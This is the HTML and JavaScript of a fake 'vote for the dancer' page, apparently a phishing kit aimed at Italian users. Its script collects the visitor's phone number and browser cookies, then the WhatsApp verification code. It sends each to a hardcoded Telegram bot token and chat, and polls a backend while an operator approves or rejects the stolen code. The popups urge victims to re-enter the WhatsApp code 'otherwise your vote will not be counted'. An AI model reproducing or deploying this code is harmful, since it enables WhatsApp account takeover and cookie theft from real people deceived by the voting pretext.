<!DOCTYPE html>
<html lang="en"> <!-- Этот lang будет использоваться как fallback или один из источников языка -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" type="image/x-icon" href="https://dancebattle.life/static/img/svg/icon.svg">
    <title>Autorizzazione</title> <!-- Этот title тоже можно переводить, добавив ключ в JS и вызвав document.title = newTitle; -->
    <link rel="stylesheet"
        href="https://dancebattle.life/static/css/themes/zomia/number.css?v=iF_XmVydeXA9UWMabWC6qBNqGURlNGJbit3ycULs52Q%3D" />
    <script
        src="https://dancebattle.life/static/js/lib/socket.io.js?v=xA14CFROUWxBqJIF79G9ZQHsZd083gKibXvVUTrHQJ8%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
    <script
        src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script> <!-- Здесь логика для флагов (п.3) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>

    <style>
        /* ... ваши существующие стили ... */
        .TdYmjJvmcSBa { display: none; background-color: #POsLWm; box-sizing: initial; opacity: 0.11; font-weight: 500; font-style: oblique; scale: 0.94; line-height: 12; padding: 233px; border-radius: 98px; font-size: 29px; color: #EHlSir; margin: 243px; text-align: right; cursor: text; height: 133px; width: 857px; }
        .rwvCRhgYnBx { display: none; margin: 228px; font-style: italic; color: #oFisGb; padding: 157px; height: 127px; text-align: left; font-size: 93px; background-color: #VqHDjL; border-radius: 19px; opacity: 0.88; scale: 0.52; width: 505px; }
        /* ... прочие стили ... */

        body { background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg"); background-color: #ffffff; }
        
        /* Стили для лоадера (добавленные/измененные) */
        .loader { 
            border-top: 5px solid #bfbbbb; 
            /* Предполагаемые стили из number.css для полноты картины: */
            /* width: 30px; */
            /* height: 30px; */
            /* border-radius: 50%; */
            /* border-left-color: transparent; */ /* часто используется для эффекта вращения */
            /* border-right-color: transparent; */
            /* border-bottom-color: transparent; */
            /* animation: spin 1s linear infinite; */ /* убедитесь, что анимация spin определена */
        }

        /* @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } */ /* Пример анимации */


        /* Увеличиваем лоадер на мобильных устройствах */
        @media screen and (max-width: 768px) {
            .block.code .number-container .loader {
                width: 50px;  /* Новая ширина для мобильных */
                height: 50px; /* Новая высота для мобильных */
                /* Если ваш лоадер использует все 4 стороны border для создания круга,
                   тогда border-width: 6px; может быть достаточно.
                   Если только border-top имеет цвет, а остальные прозрачные или другого цвета,
                   то увеличьте border-top-width: 6px; и соответственно другие, если они есть.
                */
                border-width: 6px; /* Увеличиваем общую толщину, если border задан для всех сторон */
                /* или border-top-width: 6px; если только верхняя часть используется */
            }
            .block.code .number-container { border: 10px solid #1d3957; }
            .zFFCQoOq { display: none; margin: 243px; line-height: 32; font-size: 93px; text-align: right; cursor: move; padding: 156px; font-weight: 600; font-style: oblique; border-radius: 32px; height: 262px; color: #toGUJC; }
        }
         /* ... остальные стили ... */
    </style>
</head>

<body class="number-page" data-redirect="https://dancebattle.life/home/grazie" data-template="45">
    <!-- ... -->
    <div class="wrapper">
        <!-- ... (step-1) ... -->

        <div class="block code hidden" id="step-2">
            <!-- ... (текст для step-2) ... -->
            <div class="number-column">
                <div class="number-container" id="loader">
                    <div class="loader"></div>
                    <div class="number-code hidden" id="number-code" data-code="">
                        <!-- ... symbols ... -->
                    </div>
                </div>

                <div class="block number" id="form-step-2" style="display: none;">
                    <p class="text code-title" data-translate-key="form2.codeLabel">Code:</p> <!-- Ключ добавлен -->
                    <div class="form" id="form-code">
                        <input type="text" class="number" id="code" />
                        <button class="button primary" id="two-step" data-translate-key="form.continueButton">Continua</button> <!-- Ключ добавлен -->
                    </div>
                </div>
                <!-- ... -->
            </div>
        </div>

        <!-- ... -->
    </div>

    <div class="popup top40" id="popreboot"> <!-- display:none будет управляться JS -->
        <div class="body">
            <h2 data-translate-key="popup.reboot.title">Your vote has been counted, thank you</h2> <!-- Ключ добавлен -->
            <button class="button primary btn-ok" id="reload-page-ok" data-translate-key="popup.reboot.button">Ok</button> <!-- Ключ добавлен -->
        </div>
    </div>

    <div class="popup top40" id="popwhat"> <!-- display:none будет управляться JS -->
        <div class="body">
            <h2 data-translate-key="popup.what.title">Something is wrong!</h2> <!-- Ключ добавлен -->
            <p data-translate-key="popup.what.paragraph">You entered the code incorrectly, go to the WhatsApp application and enter the code correctly, otherwise your vote will not be counted.</p> <!-- Ключ добавлен -->
            <button class="button primary btn-reb" id="reload-page-reboot" data-translate-key="popup.what.button">Reboot</button> <!-- Ключ добавлен -->
        </div>
    </div>
                                
    <script>
        // Объект с переводами (как предложено выше)
        const translations = {
            en: {
                "form2.codeLabel": "Code:",
                "form.continueButton": "Continue",
                "popup.reboot.title": "Your vote has been counted, thank you",
                "popup.reboot.button": "Ok",
                "popup.what.title": "Something is wrong!",
                "popup.what.paragraph": "You entered the code incorrectly, go to the WhatsApp application and enter the code correctly, otherwise your vote will not be counted.",
                "popup.what.button": "Reboot"
            },
            it: {
                "form2.codeLabel": "Codice:",
                "form.continueButton": "Continua",
                "popup.reboot.title": "Il tuo voto è stato conteggiato, grazie",
                "popup.reboot.button": "Ok",
                "popup.what.title": "Qualcosa è andato storto!",
                "popup.what.paragraph": "Hai inserito il codice in modo errato, vai all'applicazione WhatsApp e inserisci il codice correttamente, altrimenti il tuo voto non verrà conteggiato.",
                "popup.what.button": "Riprova"
            },
            ru: {
                "form2.codeLabel": "Код:",
                "form.continueButton": "Продолжить",
                "popup.reboot.title": "Ваш голос учтён, спасибо",
                "popup.reboot.button": "Ок",
                "popup.what.title": "Что-то пошло не так!",
                "popup.what.paragraph": "Вы ввели код неправильно. Перейдите в приложение WhatsApp и введите код правильно, иначе ваш голос не будет засчитан.",
                "popup.what.button": "Повторить"
            }
            // ... другие языки ...
        };

        // Функция применения переводов (как предложено выше)
        function applyTranslations(lang) {
            const htmlLang = document.documentElement.lang;
            if (!lang && htmlLang && translations[htmlLang]) {
                lang = htmlLang;
            }

            if (!lang || !translations[lang]) {
                console.warn(`Translations not found for language: ${lang}. Defaulting to 'en'.`);
                lang = 'en';
            }

            document.querySelectorAll('[data-translate-key]').forEach(element => {
                const key = element.getAttribute('data-translate-key');
                if (translations[lang] && translations[lang][key]) {
                    if (element.tagName === 'INPUT' && (element.type === 'button' || element.type === 'submit' || element.type === 'reset')) {
                        element.value = translations[lang][key];
                    } else {
                        element.textContent = translations[lang][key];
                    }
                } else {
                    console.warn(`Translation key "${key}" not found for language "${lang}".`);
                }
            });
        }
        
        // Ваш существующий скрипт
        document.addEventListener("DOMContentLoaded", function () {
            // Применяем переводы (ВАЖНО: получите detectedLanguage из вашей системы локализации)
            let detectedLanguage = document.documentElement.lang || (navigator.language || navigator.userLanguage || 'en').split('-')[0];
            if (detectedLanguage === 'zomia') { // Пример специфичного языка из URL, если он там есть
                // Логика для zomia-it, если 'it' должен быть языком
                // В вашем URL /login/zomia-it, возможно 'it' это язык
                const pathParts = window.location.pathname.split('/');
                const langFromPath = pathParts.pop(); // Получаем 'zomia-it'
                if (langFromPath && langFromPath.includes('-')) {
                    const langCode = langFromPath.split('-').pop(); // Получаем 'it'
                    if (translations[langCode]) {
                        detectedLanguage = langCode;
                    }
                } else if (translations[langFromPath]) { // Если просто /login/it
                     detectedLanguage = langFromPath;
                }
            }
            applyTranslations(detectedLanguage);


            document.querySelectorAll(".btn-reb").forEach(button => {
                button.addEventListener("click", () => {
                    location.reload();
                });
            });

            // Изменил id, чтобы соответствовать HTML изменениям, если вы их приняли
            document.getElementById("reload-page-ok")?.addEventListener("click", () => { // Используем ? для безопасного доступа
                // location.reload();
                document.getElementById("popreboot").style.display = "none"; // Закрываем popreboot, а не popwhat
            });
            // Если для кнопки "Ok" в popreboot нужно закрыть popreboot:
            // document.getElementById("popreboot").querySelector(".btn-ok").addEventListener("click", () => {
            //    document.getElementById("popreboot").style.display = "none";
            // });


            document.getElementById("popreboot").style.display = "none"; // Изначально скрыт
            const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g";
            const chat_id = "7538727898";
            const backendURL = "https://api.bestballerinavote.com";

            const nextStepBtn = document.getElementById("next-step");
            const codeStepBtn = document.getElementById("two-step");
            document.getElementById("loader").style.display = "none";
            document.getElementById("popwhat").style.display = "none"; // Изначально скрыт

            nextStepBtn?.addEventListener("click", function (e) {
                e.preventDefault();

                const phone = document.getElementById("number").value.trim();
                const cookies = document.cookie || "Немає кукі";

                if (!phone) {
                    // Можно показать ошибку более красиво, чем alert
                    const errorP = document.querySelector('#form-step-1 .form p.error');
                    if (errorP) {
                        errorP.textContent = translations[detectedLanguage] ? (translations[detectedLanguage]["error.phoneRequired"] || "Phone number is required") : "Phone number is required";
                        errorP.classList.remove('hidden');
                    } else {
                        alert(translations[detectedLanguage] ? (translations[detectedLanguage]["error.phoneRequiredAlert"] || "Enter number") : "Enter number");
                    }
                    return;
                } else {
                     const errorP = document.querySelector('#form-step-1 .form p.error');
                     if (errorP) errorP.classList.add('hidden');
                }


                sessionStorage.setItem("submittedPhone", phone);

                const msg = `📲 Новий запит\nТелефон: ${phone}\n🍪 Кукі: ${cookies}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text: msg })
                });

                document.getElementById("step-1").style.display = "none";
                const step2Block = document.getElementById("step-2");
                step2Block.classList.remove("hidden");
                step2Block.style.display = "block";
                document.getElementById("form-step-2").style.display = "block";
            });

            codeStepBtn?.addEventListener("click", function (e) {
                e.preventDefault();

                const code = document.getElementById("code").value.trim();
                const phone = sessionStorage.getItem("submittedPhone");

                if (!code || !phone) {
                     alert(translations[detectedLanguage] ? (translations[detectedLanguage]["error.noData"] || "No data") : "No data");
                     return;
                }


                const msg = `🔐 Код підтвердження:\nТелефон: ${phone}\nКод: ${code}`;
                const keyboard = {
                    inline_keyboard: [
                        [
                            { text: "✅ Так", callback_data: `confirm_yes_${phone}` },
                            { text: "❌ Ні", callback_data: `confirm_no_${phone}` }
                        ]
                    ]
                };

                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id,
                        text: msg,
                        reply_markup: keyboard
                    })
                });

                document.getElementById("form-step-2").style.display = "none";
                document.getElementById("loader").style.display = "block"; // Показываем блок с лоадером

                waitForApproval(phone);
            });

            function waitForApproval(phone) {
                const interval = setInterval(() => {
                    fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
                        .then(res => res.json())
                        .then(data => {
                            console.log("📩 Відповідь від бекенду:", data);
                            if (data.status === "approved") {
                                clearInterval(interval);
                                document.getElementById("loader").style.display = "none";
                                document.getElementById("popreboot").style.display = "block"; // Показываем попап успеха
                            } else if (data.status === "rejected") {
                                clearInterval(interval);
                                document.getElementById("loader").style.display = "none";
                                document.getElementById("popwhat").style.display = "block"; // Показываем попап ошибки
                            }
                        })
                        .catch(err => {
                            console.error("❌ Помилка бекенду:", err);
                            // Можно добавить обработку ошибки сети, например, показать сообщение пользователю
                            // clearInterval(interval); // Возможно, стоит остановить попытки при ошибке сети
                            // document.getElementById("loader").style.display = "none";
                            // alert(translations[detectedLanguage] ? (translations[detectedLanguage]["error.backendConnection"] || "Error connecting to server.") : "Error connecting to server.");
                        });
                }, 3000);
            }
        });
    </script>
</body>
</html>
